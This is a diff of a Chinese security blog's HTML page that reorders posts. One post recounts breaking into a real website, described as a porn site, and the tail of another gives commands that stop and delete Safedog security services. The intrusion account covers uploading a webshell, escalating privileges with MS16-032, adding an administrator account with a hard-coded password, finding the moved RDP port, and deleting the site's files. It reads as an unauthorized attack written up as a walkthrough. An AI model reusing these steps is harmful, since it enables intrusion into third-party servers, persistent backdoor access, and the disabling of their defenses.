@@ -207,78 +207,6 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/01/15/MS16-032提权/" title="MS16-032提权" itemprop="url">MS16-032提权</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>这是一个黄网的站，所以我就不打码了。如果要看我是如何GetShell的可以在我博客上看另一篇“iis7.5解析GetShell”。废话不多说了，我们开始吧！<br>PS：操作很白痴，大牛勿喷——Bug’小虫</p>
-<h3 id="1-刚开始用的php一句话，发现执行不了命令"><a href="#1-刚开始用的php一句话，发现执行不了命令" class="headerlink" title="1,刚开始用的php一句话，发现执行不了命令"></a>1,刚开始用的php一句话，发现执行不了命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/13.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="2-上asp一句话，成功执行"><a href="#2-上asp一句话，成功执行" class="headerlink" title="2,上asp一句话，成功执行"></a>2,上asp一句话，成功执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/14.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"><a href="#3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来" class="headerlink" title="3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"></a>3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080.tmp</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"><a href="#4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户" class="headerlink" title="4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"></a>4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net user caibao Heimao123!@# /add"</span>//我把ms16-032改名为32.log了</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="5-用户添加成功"><a href="#5-用户添加成功" class="headerlink" title="5,用户添加成功"></a>5,用户添加成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/16.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="6-提到管理员用户组"><a href="#6-提到管理员用户组" class="headerlink" title="6,提到管理员用户组"></a>6,提到管理员用户组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net localgroup administrators caibao /add"</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/17.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"><a href="#7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip" class="headerlink" title="7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"></a>7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/18.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="8，查看一下TermService服务对应的PID，1884"><a href="#8，查看一下TermService服务对应的PID，1884" class="headerlink" title="8，查看一下TermService服务对应的PID，1884"></a>8，查看一下TermService服务对应的PID，1884</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /avc</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/19.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="9-根据PID查找端口，果然被他改成了"><a href="#9-根据PID查找端口，果然被他改成了" class="headerlink" title="9,根据PID查找端口，果然被他改成了"></a>9,根据PID查找端口，果然被他改成了</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/20.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="10-连接远程桌面，成功连接。把它里面黄色资源一删，走人"><a href="#10-连接远程桌面，成功连接。把它里面黄色资源一删，走人" class="headerlink" title="10,连接远程桌面，成功连接。把它里面黄色资源一删，走人"></a>10,连接远程桌面，成功连接。把它里面黄色资源一删，走人</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/21.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>总结：其实总体来说还是非常顺利的，主要是16-32提2012时不是很稳定，如果失败的话可以多试两次,或许有意向不到的收获。还有就是用metasploit反弹shell时失败，因为16-032不一定要反弹shell。所以没去研究。下次遇到的话可以从防火墙入手，查看端口规则，有可能端口被拦截。</p>
-<h3 id="—–-Powered-by-Bug’小虫"><a href="#—–-Powered-by-Bug’小虫" class="headerlink" title="—– Powered by Bug’小虫"></a>—– Powered by Bug’小虫</h3>
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
       <a href="/2018/01/15/windows提权信息收集/" title="windows提权信息收集" itemprop="url">windows提权信息收集</a>
   </h1>
   <p class="article-author">By
@@ -476,6 +404,78 @@
 <p>(1)停止安全狗相关服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop    <span class="string">"Safedog Guard Center"</span>  /y </span><br><span class="line">net stop    <span class="string">"Safedog Update Center"</span> /y </span><br><span class="line">net stop    <span class="string">"SafeDogCloudHelper"</span>  /y</span><br></pre></td></tr></table></figure></p>
 <p>(2)直接删除SafeDogGuardCenter服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sc stop <span class="string">"SafeDogGuardCenter"</span>  </span><br><span class="line">sc config <span class="string">"SafeDogGuardCenter"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">"SafeDogGuardCenter"</span> </span><br><span class="line"> </span><br><span class="line">sc stop <span class="string">" SafeDogUpdateCenter"</span>  </span><br><span class="line">sc config <span class="string">" SafeDogUpdateCenter"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">" SafeDogUpdateCenter"</span> </span><br><span class="line"> </span><br><span class="line">sc stop <span class="string">" SafeDogCloudHelper"</span>  </span><br><span class="line">sc config <span class="string">" SafeDogCloudHelper"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">" SafeDogCloudHelper"</span></span><br></pre></td></tr></table></figure></p>
 
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/01/15/MS16-032提权/" title="MS16-032提权" itemprop="url">MS16-032提权</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>这是一个黄网的站，所以我就不打码了。如果要看我是如何GetShell的可以在我博客上看另一篇“iis7.5解析GetShell”。废话不多说了，我们开始吧！<br>PS：操作很白痴，大牛勿喷——Bug’小虫</p>
+<h3 id="1-刚开始用的php一句话，发现执行不了命令"><a href="#1-刚开始用的php一句话，发现执行不了命令" class="headerlink" title="1,刚开始用的php一句话，发现执行不了命令"></a>1,刚开始用的php一句话，发现执行不了命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/13.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="2-上asp一句话，成功执行"><a href="#2-上asp一句话，成功执行" class="headerlink" title="2,上asp一句话，成功执行"></a>2,上asp一句话，成功执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/14.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"><a href="#3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来" class="headerlink" title="3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"></a>3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080.tmp</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"><a href="#4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户" class="headerlink" title="4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"></a>4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net user caibao Heimao123!@# /add"</span>//我把ms16-032改名为32.log了</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="5-用户添加成功"><a href="#5-用户添加成功" class="headerlink" title="5,用户添加成功"></a>5,用户添加成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/16.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="6-提到管理员用户组"><a href="#6-提到管理员用户组" class="headerlink" title="6,提到管理员用户组"></a>6,提到管理员用户组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net localgroup administrators caibao /add"</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/17.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"><a href="#7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip" class="headerlink" title="7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"></a>7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/18.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="8，查看一下TermService服务对应的PID，1884"><a href="#8，查看一下TermService服务对应的PID，1884" class="headerlink" title="8，查看一下TermService服务对应的PID，1884"></a>8，查看一下TermService服务对应的PID，1884</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /avc</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/19.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="9-根据PID查找端口，果然被他改成了"><a href="#9-根据PID查找端口，果然被他改成了" class="headerlink" title="9,根据PID查找端口，果然被他改成了"></a>9,根据PID查找端口，果然被他改成了</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/20.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="10-连接远程桌面，成功连接。把它里面黄色资源一删，走人"><a href="#10-连接远程桌面，成功连接。把它里面黄色资源一删，走人" class="headerlink" title="10,连接远程桌面，成功连接。把它里面黄色资源一删，走人"></a>10,连接远程桌面，成功连接。把它里面黄色资源一删，走人</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/21.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>总结：其实总体来说还是非常顺利的，主要是16-32提2012时不是很稳定，如果失败的话可以多试两次,或许有意向不到的收获。还有就是用metasploit反弹shell时失败，因为16-032不一定要反弹shell。所以没去研究。下次遇到的话可以从防火墙入手，查看端口规则，有可能端口被拦截。</p>
+<h3 id="—–-Powered-by-Bug’小虫"><a href="#—–-Powered-by-Bug’小虫" class="headerlink" title="—– Powered by Bug’小虫"></a>—– Powered by Bug’小虫</h3>
         
         
         <p class="article-more-link">
